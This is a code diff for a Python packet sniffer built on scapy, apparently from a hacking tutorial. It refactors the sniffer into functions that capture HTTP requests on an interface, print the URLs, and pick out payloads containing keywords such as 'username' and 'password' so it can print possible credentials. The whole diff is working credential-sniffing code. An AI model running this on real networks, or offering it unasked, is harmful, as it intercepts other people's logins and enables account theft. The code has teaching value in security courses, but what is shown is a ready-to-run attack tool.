@@ -18,17 +18,28 @@ def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=sniffed_packet)
 
 
+def get_url(packet):
+    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+    return url
+
+
+def get_password(packet):
+    if packet.haslayer(scapy.Raw):
+        load = packet[scapy.Raw].load
+        keywords = ["username", "user", "login", "email", "mail", "password", "pass"]
+        for word in keywords:
+            if word in load:
+                return load
+
+
 def sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
-        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
-        print(url)
-        if packet.haslayer(scapy.Raw):
-            load = packet[scapy.Raw].load
-            keywords = ["username", "user", "login", "email", "mail", "password", "pass"]
-            for word in keywords:
-                if word in load:
-                    print(load)
-                    break
+        url = get_url(packet)
+        print("[+] HTTP Request >> ", url)
+
+        login_info = get_password(packet)
+        if login_info:
+            print("\n\n[+] Possible username/password >> " + login_info + "\n\n")
 
 
 sniff(get_arguments())
